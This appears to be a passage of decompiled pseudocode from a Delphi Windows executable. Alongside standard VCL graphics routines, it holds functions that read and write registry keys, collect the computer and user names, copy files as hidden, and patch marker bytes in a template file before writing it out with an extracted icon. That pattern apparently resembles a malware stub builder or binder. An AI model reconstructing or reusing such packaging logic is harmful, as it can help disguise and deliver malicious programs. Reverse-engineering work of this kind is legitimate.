  int result; // eax
  unsigned int v8[6]; // [esp-Ch] [ebp-1Ch] BYREF
  int v9; // [esp+Ch] [ebp-4h]
  int savedregs; // [esp+10h] [ebp+0h] BYREF

  TObject_Create(&off_413628);
  v9 = v6;
  v8[2] = (unsigned int)&savedregs;
  v8[1] = (unsigned int)&loc_415988;
  v8[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v8);
  *(_DWORD *)(v6 + 8) = a2;
  *(_DWORD *)(v9 + 12) = a3;
  __writefsdword(0, v8[0]);
  sub_415580(v9);
  sub_415584(*(_DWORD **)(a1 + 32));
  result = v9;
  *(_DWORD *)(a1 + 32) = v9;
  return result;
}
// 415961: variable 'v6' is possibly undefined
// 413628: using guessed type int (*off_413628)();

//----- (004159BC) --------------------------------------------------------
int __usercall sub_4159BC@<eax>(int a1@<eax>, int a2@<edx>)
{
  TIcon::NewImage(a1, a2, 0);
  return (*(int (**)(void))(*(_DWORD *)a1 + 16))();
}

//----- (004159D4) --------------------------------------------------------
void __usercall sub_4159D4(int a1@<eax>, void *a2@<edx>)
{
  int v2; // ecx

  v2 = *(_DWORD *)(a1 + 32);
  if ( *(_DWORD *)(v2 + 8) )
    sub_414390(v2, a2);
  else
    *(_DWORD *)(a1 + 40) = a2;
}

//----- (004159F0) --------------------------------------------------------
void __usercall sub_4159F0(int a1@<eax>, void *a2@<edx>)
{
  int v2; // ecx

  v2 = *(_DWORD *)(a1 + 32);
  if ( *(_DWORD *)(v2 + 8) )
    sub_414390(v2, a2);
  else
    *(_DWORD *)(a1 + 36) = a2;
}

//----- (00415A08) --------------------------------------------------------
void __usercall Graphics::TIcon::SaveToStream(Graphics::TIcon *this@<ecx>, Classes::TStream *a2@<edx>, int a3@<eax>)
{
  int v5; // ebx
  Classes::TStream *v6; // eax

  Graphics::TIcon::ImageNeeded(this, a3, a2);
  v5 = *(_DWORD *)(*(_DWORD *)(a3 + 32) + 12);
  v6 = (Classes::TStream *)Classes::TStream::GetSize(v5);
  Classes::TStream::WriteBuffer(v6, *(const void **)(v5 + 4), (int)a2);
}

//----- (00415A34) --------------------------------------------------------
void __fastcall sub_415A34(int a1, void *a2, int a3)
{
  sub_414390(a1, a2);
}

//----- (00415A48) --------------------------------------------------------
void __fastcall sub_415A48(int a1, void *a2, int a3)
{
  sub_414390(a1, a2);
}

//----- (00415A5C) --------------------------------------------------------
HPALETTE Graphics::_16878()
{
  HDC v0; // ebx
  HPALETTE result; // eax

  v0 = GetDC(0);
  nNumerator = GetDeviceCaps(v0, 90);
  ReleaseDC(0, v0);
  result = Graphics::_16605(byte_41DA74);
  ho = result;
  return result;
}

//----- (00415A94) --------------------------------------------------------
int __usercall Graphics::GetDefFontCharSet@<eax>(int a1@<ebx>)
{
  HDC v2; // esi
  struct tagTEXTMETRICA v4; // [esp+0h] [ebp-40h] BYREF

  LOBYTE(a1) = 1;
  v2 = GetDC(0);
  if ( v2 )
  {
    if ( SelectObject(v2, dword_41E688) && GetTextMetricsA(v2, &v4) )
      LOBYTE(a1) = v4.tmCharSet;
    ReleaseDC(0, v2);
  }
  return a1;
}

//----- (00415AD8) --------------------------------------------------------
char __usercall Graphics::_16837@<al>(int a1@<ebx>)
{
  int v1; // eax
  char v2; // bl

  dword_41D830 = -MulDiv(8, nNumerator, 72);
  LOBYTE(v1) = (_BYTE)off_41DC84;
  if ( *((_BYTE *)off_41DC84 + 8) )
  {
    v2 = Graphics::GetDefFontCharSet(a1);
    LOBYTE(v1) = v2 + 0x80;
    if ( v2 == (char)0x80 )
    {
      qmemcpy(aMsSansSerif, dword_415B3C, 0x10u);
      v1 = -MulDiv(9, nNumerator, 72);
      dword_41D830 = v1;
      byte_41D836 = v2;
    }
  }
  return v1;
}
// 415B3C: using guessed type int dword_415B3C[4];
// 41D830: using guessed type int dword_41D830;
// 41D836: using guessed type char byte_41D836;
// 41DC84: using guessed type void *off_41DC84;

//----- (00415BA8) --------------------------------------------------------
// Borland Visual Component Library & Packages
// BDS 2005-2007 and Delphi6-7 Visual Component Library
_DWORD *__usercall Graphics::_16840@<eax>(int a1@<eax>, char a2@<dl>)
{
  char v2; // bl
  _DWORD *v3; // esi
  char v5; // [esp-10h] [ebp-18h]

  if ( a2 )
    a1 = System::__linkproc__ ClassCreate(a1, a2, v5);
  v2 = a2;
  v3 = (_DWORD *)a1;
  InitializeCriticalSection_0((LPCRITICAL_SECTION)(a1 + 8));
  if ( v2 )
    sub_402D34(v3);
  return v3;
}
// 415BB1: variable 'v5' is possibly undefined
// 415BB6: variable 'a2' is possibly undefined

//----- (00415BE0) --------------------------------------------------------
// Borland Visual Component Library & Packages
// BDS 2005-2007 and Delphi6-7 Visual Component Library
void __usercall Graphics::_16841(_DWORD *a1@<eax>, char a2@<dl>)
{
  _DWORD *v2; // eax
  char v3; // dl
  char v4; // bl
  _DWORD *v5; // esi

  v2 = sub_402D3C(a1, a2);
  v4 = v3;
  v5 = v2;
  Graphics::_16846((int)v2);
  DeleteCriticalSection_0((LPCRITICAL_SECTION)(v5 + 2));
  if ( v4 > 0 )
    sub_402D2C(v5);
}
// 415BE7: variable 'v3' is possibly undefined

//----- (00415C0C) --------------------------------------------------------
void __usercall sub_415C0C(int a1@<eax>)
{
  EnterCriticalSection_0((LPCRITICAL_SECTION)(a1 + 8));
}

//----- (00415C18) --------------------------------------------------------
void __usercall sub_415C18(int a1@<eax>)
{
  LeaveCriticalSection_0((LPCRITICAL_SECTION)(a1 + 8));
}

//----- (00415C24) --------------------------------------------------------
// Borland Visual Component Library & Packages
// BDS 2005-2007 and Delphi6-7 Visual Component Library
_DWORD *__usercall Graphics::_16846@<eax>(int a1@<eax>)
{
  _DWORD *v1; // eax
  _DWORD *result; // eax
  unsigned int v3[2]; // [esp-Ch] [ebp-18h] BYREF
  int *v4; // [esp-4h] [ebp-10h]
  _DWORD *v5; // [esp+0h] [ebp-Ch]
  int v6; // [esp+4h] [ebp-8h]
  int v7; // [esp+8h] [ebp-4h]
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  v7 = a1;
  while ( 1 )
  {
    result = *(_DWORD **)(v7 + 4);
    if ( !result )
      break;
    v6 = *(_DWORD *)(v7 + 4);
    v5 = result;
    sub_415C0C(v7);
    v4 = &savedregs;
    v3[1] = (unsigned int)&loc_415C6F;
    v3[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)v3);
    *(_DWORD *)(v7 + 4) = *v5;
    __writefsdword(0, v3[0]);
    v4 = (int *)&loc_415C76;
    sub_415C18(v7);
    v1 = (_DWORD *)v5[1];
    if ( v1 )
      sub_402BDC(v1);
    sub_4025B0(v6);
  }
  return result;
}

//----- (00415C9C) --------------------------------------------------------
int Graphics::Finalization()
{
  int result; // eax
  unsigned int v2[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v2[2] = (unsigned int)&savedregs;
  v2[1] = (unsigned int)&loc_415D65;
  v2[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v2);
  if ( !++dword_41E678 )
  {
    sub_402BDC((_DWORD *)dword_41E6D0);
    sub_402BDC((_DWORD *)dword_41DA6C);
    sub_402BDC((_DWORD *)dword_41DA68);
    Controls::_16617();
    sub_402BDC((_DWORD *)dword_41DA70);
    sub_402BDC((_DWORD *)dword_41E6CC);
    sub_402BDC((_DWORD *)dword_41E6C0);
    sub_402BDC((_DWORD *)dword_41E6C4);
    sub_402BDC((_DWORD *)dword_41E6C8);
    DeleteObject(ho);
    DeleteCriticalSection_0(&stru_41E690);
    DeleteCriticalSection_0(&stru_41E6A8);
    System::__linkproc__ FinalizeArray(&dword_41D9A8, (char *)dword_40BE88, 18);
    System::__linkproc__ FinalizeArray(&dword_41D858, (char *)dword_40BE88, 42);
  }
  result = 0;
  __writefsdword(0, v2[0]);
  return result;
}
// 40BE88: using guessed type int dword_40BE88[6];
// 41DA68: using guessed type int dword_41DA68;
// 41DA6C: using guessed type int dword_41DA6C;
// 41DA70: using guessed type int dword_41DA70;
// 41E678: using guessed type int dword_41E678;
// 41E6C0: using guessed type int dword_41E6C0;
// 41E6C4: using guessed type int dword_41E6C4;
// 41E6C8: using guessed type int dword_41E6C8;
// 41E6CC: using guessed type int dword_41E6CC;
// 41E6D0: using guessed type int dword_41E6D0;

//----- (00415D70) --------------------------------------------------------
void __usercall Graphics::initialization(int a1@<ebx>)
{
  if ( dword_41E678-- == 0 )
  {
    Graphics::_16878();
    InitializeCriticalSection_0(&stru_41E690);
    InitializeCriticalSection_0(&stru_41E6A8);
    h = GetStockObject(7);
    dword_41E684 = GetStockObject(5);
    dword_41E688 = GetStockObject(13);
    dword_41E68C = (int)LoadIconA(0, (LPCSTR)0x7F00);
    Graphics::_16837(a1);
    dword_41E6C0 = (int)Graphics::_16453((int)dword_413758, 1, 44);
    dword_41E6C4 = (int)Graphics::_16453((int)dword_413758, 1, 16);
    dword_41E6C8 = (int)Graphics::_16453((int)dword_413758, 1, 16);
    dword_41E6D0 = (int)Graphics::_16840((int)dword_415B98, 1);
    dword_41DA70 = (int)Classes::TThreadList::TThreadList((char *)dword_40B96C, 1);
    dword_41E6CC = (int)Classes::TThreadList::TThreadList((char *)dword_40B96C, 1);
    Classes::RegisterIntegerConsts(
      sub_413B4C,
      (bool (__fastcall __high *)(const System::AnsiString, int *))sub_413B5C,
      (int)dword_4133A4);
    Classes::RegisterIntegerConsts(
      sub_413D20,
      (bool (__fastcall __high *)(const System::AnsiString, int *))sub_413D30,
      (int)dword_413480);
  }
}
// 40B96C: using guessed type int dword_40B96C[3];
// 4133A4: using guessed type int dword_4133A4[5];
// 413480: using guessed type int dword_413480[6];
// 413758: using guessed type int dword_413758[5];
// 415B98: using guessed type int dword_415B98[4];
// 41DA70: using guessed type int dword_41DA70;
// 41E678: using guessed type int dword_41E678;
// 41E68C: using guessed type int dword_41E68C;
// 41E6C0: using guessed type int dword_41E6C0;
// 41E6C4: using guessed type int dword_41E6C4;
// 41E6C8: using guessed type int dword_41E6C8;
// 41E6CC: using guessed type int dword_41E6CC;
// 41E6D0: using guessed type int dword_41E6D0;

//----- (00415E74) --------------------------------------------------------
int Finalization_0_7_13()
{
  int result; // eax
  unsigned int v1[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v1[2] = (unsigned int)&savedregs;
  v1[1] = (unsigned int)&loc_415E99;
  v1[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v1);
  ++dword_41E6D4;
  result = 0;
  __writefsdword(0, v1[0]);
  return result;
}
// 41E6D4: using guessed type int dword_41E6D4;

//----- (00415EA4) --------------------------------------------------------
void sub_415EA4()
{
  --dword_41E6D4;
}
// 41E6D4: using guessed type int dword_41E6D4;

//----- (00415EAC) --------------------------------------------------------
void __userpurge sub_415EAC(int a1@<eax>, char *a2@<edx>, char *a3@<ecx>, char **a4, int a5, int a6)
{
  LStr *v6; // ecx
  int v7; // eax
  _DWORD *v8; // ebx
  Registry::TRegistry *v9; // ecx
  LStr *v10; // ecx
  struct _EXCEPTION_REGISTRATION_RECORD *v11; // [esp-Ch] [ebp-24h] BYREF
  void *v12; // [esp-8h] [ebp-20h]
  int *v13; // [esp-4h] [ebp-1Ch]
  LStr *v14; // [esp+0h] [ebp-18h]
  char *v15; // [esp+8h] [ebp-10h] BYREF
  char *v16; // [esp+Ch] [ebp-Ch]
  char *v17; // [esp+10h] [ebp-8h]
  int v18; // [esp+14h] [ebp-4h]
  int savedregs; // [esp+18h] [ebp+0h] BYREF

  v15 = 0;
  v16 = a3;
  v17 = a2;
  v18 = a1;
  sub_4038D8(a1);
  sub_4038D8((int)v17);
  sub_4038D8((int)v16);
  v13 = &savedregs;
  v12 = &loc_415F9C;
  v11 = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v11);
  System::__linkproc__ LStrClr(v6);
  v7 = Registry::TRegistry::TRegistry((int)dword_40E610, 1);
  v8 = (_DWORD *)v7;
  if ( a5 == 1 )
  {
    Registry::TRegistry::SetRootKey(0x80000002, v7);
  }
  else if ( a5 == 2 )
  {
    Registry::TRegistry::SetRootKey(0x80000000, v7);
  }
  else
  {
    Registry::TRegistry::SetRootKey(0x80000001, v7);
  }
  LOBYTE(v9) = 1;
  Registry::TRegistry::OpenKey(v9, v18, (int)v8);
  if ( (unsigned __int8)sub_40EAE4((int)v8, v17, (int)v8) )
    Registry::TRegistry::ReadString((Registry::TRegistry *)&v15, (const int)v17, (int)v8);
  if ( a6 == 1 )
    Registry::TRegistry::WriteString((int)v8, v17, v16);
  (*(void (__stdcall **)(struct _EXCEPTION_REGISTRATION_RECORD *))(*v8 - 4))(v11);
  __linkproc__ LStrAsg(a4, v15);
  v10 = v14;
  __writefsdword(0, (unsigned int)v12);
  v14 = (LStr *)&loc_415FA3;
  System::__linkproc__ LStrArrayClr(v10, 4);
}
// 415EEE: variable 'v6' is possibly undefined
// 415F3A: variable 'v9' is possibly undefined
// 40E610: using guessed type int dword_40E610[2];

//----- (00415FAC) --------------------------------------------------------
void __usercall sub_415FAC(int a1@<eax>, int a2@<edx>, char **a3@<ecx>)
{
  LStr *v3; // ecx
  int v4; // ebx
  int v5; // esi
  int v6; // edi
  LStr *v7; // ecx
  LStr *v8; // ecx
  unsigned int v9[2]; // [esp-Ch] [ebp-34h] BYREF
  LStr *v10; // [esp-4h] [ebp-2Ch]
  BYTE *v11; // [esp+Ch] [ebp-1Ch] BYREF
  BYTE *v12; // [esp+10h] [ebp-18h] BYREF
  BYTE *v13; // [esp+14h] [ebp-14h] BYREF
  int v14; // [esp+18h] [ebp-10h]
  char **v15; // [esp+1Ch] [ebp-Ch]
  int v16; // [esp+20h] [ebp-8h]
  int v17; // [esp+24h] [ebp-4h]
  int savedregs; // [esp+28h] [ebp+0h] BYREF

  v11 = 0;
  v12 = 0;
  v13 = 0;
  v15 = a3;
  v16 = a2;
  v17 = a1;
  sub_4038D8(a1);
  v10 = (LStr *)&savedregs;
  v9[1] = (unsigned int)&loc_41608C;
  v9[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v9);
  System::__linkproc__ LStrClr(v3);
  v4 = 6;
  v14 = sub_403724(v17);
  v5 = v14;
  if ( v14 > 0 )
  {
    v6 = 1;
    do
    {
      if ( ++v4 == 8 )
        v4 = 4;
      if ( v16 == 1 )
      {
        sub_403670(&v12);
        System::__linkproc__ LStrCat(&v13, (char *)v12);
      }
      else
      {
        sub_403670(&v11);
        System::__linkproc__ LStrCat(&v13, (char *)v11);
      }
      ++v6;
      --v5;
    }
    while ( v5 );
  }
  __linkproc__ LStrAsg(v15, (char *)v13);
  v7 = v10;
  __writefsdword(0, v9[0]);
  v10 = (LStr *)&loc_416093;
  System::__linkproc__ LStrArrayClr(v7, 3);
  System::__linkproc__ LStrClr(v8);
}
// 415FE2: variable 'v3' is possibly undefined
// 416086: variable 'v8' is possibly undefined

//----- (0041609C) --------------------------------------------------------
int __usercall sub_41609C@<eax>(int a1@<eax>, BYTE **a2@<edx>)
{
  unsigned int v4[2]; // [esp-Ch] [ebp-1Ch] BYREF
  int *v5; // [esp-4h] [ebp-14h]
  UINT uSize; // [esp+4h] [ebp-Ch] BYREF
  LPSTR lpBuffer; // [esp+8h] [ebp-8h]
  BYTE **v8; // [esp+Ch] [ebp-4h]
  int savedregs; // [esp+10h] [ebp+0h] BYREF

  v8 = a2;
  uSize = 261;
  lpBuffer = (LPSTR)sub_402598(261);
  v5 = &savedregs;
  v4[1] = (unsigned int)&loc_41616A;
  v4[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v4);
  switch ( a1 )
  {
    case 1:
      GetWindowsDirectoryA(lpBuffer, uSize);
      break;
    case 2:
      GetSystemDirectoryA(lpBuffer, uSize);
      break;
    case 3:
      GetCurrentDirectoryA(uSize, lpBuffer);
      break;
    case 4:
      GetComputerNameA(lpBuffer, &uSize);
      break;
    case 5:
      GetUserNameA(lpBuffer, &uSize);
      break;
    case 6:
      GetTempPathA(0x104u, lpBuffer);
      break;
    default:
      break;
  }
  __writefsdword(0, v4[0]);
  v5 = (int *)&loc_416171;
  __linkproc__ LStrFromPChar_0(v8, (BYTE *)lpBuffer);
  return sub_4025B0((int)lpBuffer);
}

//----- (00416178) --------------------------------------------------------
int __usercall sub_416178@<eax>(char *a1@<eax>, char *a2@<edx>, char a3@<cl>)
{
  int v3; // ebx
  char *v4; // eax
  LStr *v5; // ecx
  char *v7; // [esp-14h] [ebp-24h]
  unsigned int v8[2]; // [esp-Ch] [ebp-1Ch] BYREF
  LStr *v9; // [esp-4h] [ebp-14h]
  char v10; // [esp+7h] [ebp-9h]
  char *v11; // [esp+8h] [ebp-8h]
  char *v12; // [esp+Ch] [ebp-4h]
  int savedregs; // [esp+10h] [ebp+0h] BYREF

  v10 = a3;
  v11 = a2;
  v12 = a1;
  sub_4038D8((int)a1);
  sub_4038D8((int)v11);
  v9 = (LStr *)&savedregs;
  v8[1] = (unsigned int)&loc_4161FD;
  v8[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v8);
  v3 = 0;
  if ( !sub_4071A8(v11) )
  {
    v7 = sub_4038E8(v11);
    v4 = sub_4038E8(v12);
    CopyFileA(v4, v7, 0);
    if ( v10 )
      Sysutils::FileSetAttr(2u, v11);
    LOBYTE(v3) = 1;
  }
  v5 = v9;
  __writefsdword(0, v8[0]);
  v9 = (LStr *)&loc_416204;
  System::__linkproc__ LStrArrayClr(v5, 2);
  return v3;
}

//----- (0041620C) --------------------------------------------------------
void __usercall sub_41620C(int a1@<eax>, BYTE **a2@<edx>)
{
  int v3; // ebx
  LStr *v4; // ecx
  unsigned int v5[2]; // [esp-Ch] [ebp-2Ch] BYREF
  LStr *v6; // [esp-4h] [ebp-24h]
  char v7[4]; // [esp+8h] [ebp-18h] BYREF
  unsigned __int8 v8; // [esp+Ch] [ebp-14h] BYREF
  char v9; // [esp+Dh] [ebp-13h]
  char v10[4]; // [esp+10h] [ebp-10h] BYREF
  char v11[4]; // [esp+14h] [ebp-Ch] BYREF
  BYTE *v12; // [esp+18h] [ebp-8h] BYREF
  int v13; // [esp+1Ch] [ebp-4h]
  int savedregs; // [esp+20h] [ebp+0h] BYREF

  v12 = 0;
  v13 = a1;
  sub_4038D8(a1);
  v6 = (LStr *)&savedregs;
  v5[1] = (unsigned int)&loc_4162CE;
  v5[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v5);
  v3 = sub_403724(v13);
  v11[1] = *(_BYTE *)(v13 + v3 - 3);
  v11[0] = 1;
  sub_402848(v10, v11);
  v9 = *(_BYTE *)(v13 + v3 - 2);
  v8 = 1;
  __linkproc__ PStrNCat((unsigned __int8 *)v10, &v8, 2u);
  sub_402848(v7, v10);
  v9 = *(_BYTE *)(v13 + v3 - 1);
  v8 = 1;
  __linkproc__ PStrNCat((unsigned __int8 *)v7, &v8, 3u);
  sub_4036EC(&v12, (unsigned __int8 *)v7);
  Sysutils::LowerCase((int)v12, a2);
  v4 = v6;
  __writefsdword(0, v5[0]);
  v6 = (LStr *)&loc_4162D5;
  System::__linkproc__ LStrArrayClr(v4, 2);
}

//----- (004162DC) --------------------------------------------------------
void __usercall sub_4162DC(int a1@<eax>, int a2@<edx>, char *a3@<ecx>)
{
  int v4; // edi
  int v5; // esi
  _BYTE *v6; // ebx
  char *v7; // ecx
  char v8; // zf
  int v9; // edx
  int v10; // eax
  LStr *v11; // ecx
  unsigned int v12[2]; // [esp-Ch] [ebp-24h] BYREF
  LStr *v13; // [esp-4h] [ebp-1Ch]
  BYTE *v14; // [esp+Ch] [ebp-Ch] BYREF
  char *v15; // [esp+10h] [ebp-8h]
  int v16; // [esp+14h] [ebp-4h]
  int savedregs; // [esp+18h] [ebp+0h] BYREF

  v14 = 0;
  v15 = a3;
  v16 = a2;
  sub_4038D8(a2);
  sub_4038D8((int)v15);
  v13 = (LStr *)&savedregs;
  v12[1] = (unsigned int)&loc_41638C;
  v12[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v12);
  v4 = a1;
  if ( a1 > 0 )
  {
    v5 = 1;
    v6 = &unk_41E6D8;
    while ( 1 )
    {
      if ( *v6 == 70 && v6[1] == 65 )
      {
        sub_403670(&v14);
        System::__linkproc__ LStrCmp(v7, v15);
        if ( v8 )
          break;
      }
      ++v5;
      ++v6;
      if ( !--v4 )
        goto LABEL_11;
    }
    v9 = sub_403724(v16);
    if ( v9 > 0 )
    {
      v10 = 1;
      do
      {
        byte_41E6D9[v10 + v5] = *(_BYTE *)(v16 + v10 - 1);
        ++v10;
        --v9;
      }
      while ( v9 );
    }
  }
LABEL_11:
  v11 = v13;
  __writefsdword(0, v12[0]);
  v13 = (LStr *)&loc_416393;
  System::__linkproc__ LStrArrayClr(v11, 3);
}
// 41633C: variable 'v7' is possibly undefined
// 416341: variable 'v8' is possibly undefined

//----- (0041639C) --------------------------------------------------------
void __userpurge sub_41639C(int a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4, int a5)
{
  int v7; // edx
  int v8; // edi
  _BYTE *v9; // eax
  int v10; // esi
  int v11; // ebx
  LStr *v12; // ecx
  LStr *v13; // ecx
  unsigned int v14[2]; // [esp-Ch] [ebp-20h] BYREF
  LStr *v15; // [esp-4h] [ebp-18h]
  BYTE *v16; // [esp+Ch] [ebp-8h] BYREF
  int v17; // [esp+10h] [ebp-4h]
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  v16 = 0;
  v17 = a2;
  sub_4038D8(a4);
  v15 = (LStr *)&savedregs;
  v14[1] = (unsigned int)&loc_416468;
  v14[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v14);
  v7 = a1;
  if ( a1 > 0 )
  {
    v8 = 1;
    v9 = &unk_41E6D8;
    while ( *v9 != 0xC0 || v9[1] != 0xC0 || v9[2] != 0xC0 || v9[4] != 0x80 || v9[5] != 0x80 || v9[6] != 0x80 )
    {
      ++v8;
      ++v9;
      if ( !--v7 )
        goto LABEL_17;
    }
    v10 = a3;
    if ( a3 > 0 )
    {
      v11 = 1;
      do
      {
        if ( v17 == 1 )
        {
          *((_BYTE *)&dword_41E6D4 + v11 + v8 + 3) = *(_BYTE *)(a4 + v11 - 1);
        }
        else
        {
          sub_403670(&v16);
          System::__linkproc__ LStrCat((BYTE **)(a5 - 4), (char *)v16);
        }
        ++v11;
        --v10;
      }
      while ( v10 );
    }
  }
LABEL_17:
  v12 = v15;
  __writefsdword(0, v14[0]);
  v15 = (LStr *)&loc_41646F;
  System::__linkproc__ LStrClr(v12);
  System::__linkproc__ LStrClr(v13);
}
// 416462: variable 'v13' is possibly undefined
// 41E6D4: using guessed type int dword_41E6D4;

//----- (00416478) --------------------------------------------------------
void __userpurge sub_416478(char *a1@<eax>, char *a2@<edx>, BYTE *a3@<ecx>, char a4, int a5, int a6, int a7, int a8, int a9, char *a10)
{
  LStr *v10; // ecx
  char *v11; // eax
  HICON v12; // eax
  int v13; // esi
  char *v14; // ebx
  LStr *v15; // ecx
  LStr *v16; // ecx
  LStr *v17; // ecx
  LStr *v18; // ecx
  LStr *v19; // ecx
  struct _EXCEPTION_REGISTRATION_RECORD *v20; // [esp-18h] [ebp-53Ch] BYREF
  void *v21; // [esp-14h] [ebp-538h]
  int *v22; // [esp-10h] [ebp-534h]
  struct _EXCEPTION_REGISTRATION_RECORD *v23; // [esp-Ch] [ebp-530h] BYREF
  void *v24; // [esp-8h] [ebp-52Ch]
  LStr *v25; // [esp-4h] [ebp-528h]
  void *v26; // [esp+0h] [ebp-524h]
  char *v27; // [esp+8h] [ebp-51Ch] BYREF
  unsigned __int8 v28[256]; // [esp+Ch] [ebp-518h] BYREF
  BYTE *v29; // [esp+10Ch] [ebp-418h] BYREF
  BYTE *v30; // [esp+110h] [ebp-414h] BYREF
  char *v31; // [esp+114h] [ebp-410h] BYREF
  _DWORD v32[83]; // [esp+118h] [ebp-40Ch] BYREF
  _DWORD v33[83]; // [esp+264h] [ebp-2C0h] BYREF
  _DWORD v34[83]; // [esp+3B0h] [ebp-174h] BYREF
  _DWORD *v35; // [esp+4FCh] [ebp-28h]
  char v36; // [esp+503h] [ebp-21h] BYREF
  char *v37; // [esp+504h] [ebp-20h] BYREF
  int v38; // [esp+508h] [ebp-1Ch] BYREF
  int v39; // [esp+50Ch] [ebp-18h]
  int v40; // [esp+510h] [ebp-14h] BYREF
  BYTE *v41; // [esp+514h] [ebp-10h]
  char *v42; // [esp+518h] [ebp-Ch]
  char *v43; // [esp+51Ch] [ebp-8h]
  int v44; // [esp+520h] [ebp-4h]
  int savedregs; // [esp+524h] [ebp+0h] BYREF

  v27 = 0;
  v29 = 0;
  v30 = 0;
  v31 = 0;
  v37 = 0;
  v44 = 0;
  v41 = a3;
  v42 = a2;
  v43 = a1;
  sub_4038D8((int)a1);
  sub_4038D8((int)v42);
  sub_4038D8((int)v41);
  sub_4038D8((int)a10);
  sub_4038D8(a9);
  sub_4038D8(a8);
  sub_4038D8(a7);
  v25 = (LStr *)&savedregs;
  v24 = &loc_4168AD;
  v23 = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v23);
  sub_415EAC((int)a, (char *)dword_4168D0, (char *)dword_4168C4, &v31, 1, 1);
  v39 = 0;
  System::__linkproc__ LStrClr(v10);
  sub_403670(&v30);
  v38 = sub_403724((int)v30);
  System::__linkproc__ Assign(v34, v43);
  System::__linkproc__ LStrCat3(&v29, v41, a10);
  System::__linkproc__ Assign(v33, (char *)v29);
  *off_41DC30 = 0;
  if ( a5 == 1 )
  {
    sub_40296C(a6, v28);
    sub_4036EC((BYTE **)&v37, v28);
  }
  else
  {
    __linkproc__ LStrLAsg(&v37, "        ");
  }
  sub_40510D((int)v34, 1);
  sub_40265C();
  sub_405124((int)v33, 1);
  sub_40265C();
  if ( a4 )
  {
    v35 = Graphics::TIcon::TIcon(&off_413684, 1);
    v22 = &savedregs;
    v21 = &loc_416673;
    v20 = NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)&v20);
    sub_415FAC((int)dword_4168F0, 0, &v27);
    System::__linkproc__ LStrCat3((BYTE **)&dword_41EEF4, (BYTE *)dword_41EEF0, v27);
    v11 = sub_4038E8(v42);
    v12 = ExtractIconA(hInst, v11, 0);
    sub_4159BC((int)v35, (int)v12);
    (*(void (__stdcall **)(struct _EXCEPTION_REGISTRATION_RECORD *, void *, int *, struct _EXCEPTION_REGISTRATION_RECORD *))(*v35 + 76))(
      v20,
      v21,
      v22,
      v23);
    Sysutils::FileSetAttr(2u, dword_41EEF4);
    __writefsdword(0, (unsigned int)v24);
    v26 = &loc_41667A;
    sub_402BDC(v35);
    System::__linkproc__ Assign(v32, dword_41EEF4);
    sub_40510D((int)v32, 1);
    sub_40265C();
    do
    {
      sub_404EB8((int)v32, &unk_41E6D8, 2048, (DWORD *)&v40);
      sub_40265C();
      sub_41639C(v40, 0, 676, 0, (int)&savedregs);
    }
    while ( v40 );
    CLOSE((int)v32);
    sub_40265C();
  }
  do
  {
    sub_404EB8((int)v34, &unk_41E6D8, 2048, (DWORD *)&v40);
    sub_40265C();
    sub_4162DC(v40, a9, (char *)dword_416904);
    sub_4162DC(v40, a7, (char *)dword_416910);
    sub_4162DC(v40, (int)v37, (char *)dword_41691C);
    sub_4162DC(v40, a8, (char *)&dword_416928);
    if ( a4 )
      sub_41639C(v40, 1, 676, v44, (int)&savedregs);
    if ( a5 == 1 )
    {
      sub_404F1C((int)v33, &unk_41E6D8, v40, (DWORD *)&v40);
      sub_40265C();
    }
    else
    {
      v13 = 2048;
      v14 = (char *)&unk_41E6D8;
      do
      {
        v36 = *v14;
        if ( ++v39 <= a6 )
        {
          sub_404F1C((int)v33, &v36, v38, (DWORD *)&v38);
          sub_40265C();
        }
        ++v14;
        --v13;
      }
      while ( v13 );
    }
  }
  while ( v40 );
  if ( a5 == 1 )
  {
    System::__linkproc__ Assign(v32, v42);
    sub_40510D((int)v32, 1);
    sub_40265C();
    do
    {
      sub_404EB8((int)v32, &unk_41E6D8, 2048, (DWORD *)&v40);
      sub_40265C();
      sub_404F1C((int)v33, &unk_41E6D8, v40, (DWORD *)&v40);
      sub_40265C();
    }
    while ( v40 );
    CLOSE((int)v32);
    sub_40265C();
  }
  CLOSE((int)v34);
  sub_40265C();
  CLOSE((int)v33);
  sub_40265C();
  v15 = v25;
  __writefsdword(0, (unsigned int)v23);
  v25 = (LStr *)&loc_4168B4;
  System::__linkproc__ LStrClr(v15);
  System::__linkproc__ LStrArrayClr(v16, 3);
  System::__linkproc__ LStrClr(v17);
  System::__linkproc__ LStrArrayClr(v18, 4);
  System::__linkproc__ LStrArrayClr(v19, 4);
}
// 416519: variable 'v10' is possibly undefined
// 416885: variable 'v16' is possibly undefined
// 41688D: variable 'v17' is possibly undefined
// 41689A: variable 'v18' is possibly undefined
// 4168A7: variable 'v19' is possibly undefined
// 413684: using guessed type void *off_413684;
// 4168C4: using guessed type int dword_4168C4[3];
// 4168D0: using guessed type int dword_4168D0[3];
// 4168F0: using guessed type int dword_4168F0[3];
// 416904: using guessed type int dword_416904[3];
// 416910: using guessed type int dword_416910[3];
// 41691C: using guessed type int dword_41691C[3];
// 416928: using guessed type int dword_416928;
// 41DC30: using guessed type char *off_41DC30;
